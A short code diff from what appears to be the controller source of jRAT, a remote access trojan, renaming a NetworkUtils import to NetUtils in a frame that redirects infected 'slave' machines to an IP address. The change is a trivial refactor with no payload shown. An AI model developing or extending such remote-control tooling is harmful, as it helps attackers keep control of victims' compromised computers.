@@ -26,7 +26,7 @@ import pro.jrat.Main;
 import pro.jrat.Slave;
 import pro.jrat.exceptions.CloseException;
 import pro.jrat.packets.outgoing.Packet75Redirect;
-import pro.jrat.utils.NetworkUtils;
+import pro.jrat.utils.NetUtils;
 
 
 
@@ -93,7 +93,7 @@ public class FrameRedirect extends BaseFrame {
 		btnExtIP.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				try {
-					txtIP.setText(NetworkUtils.getIP());
+					txtIP.setText(NetUtils.getIP());
 				} catch (Exception ex) {
 					ex.printStackTrace();
 					ErrorDialog.create(ex);
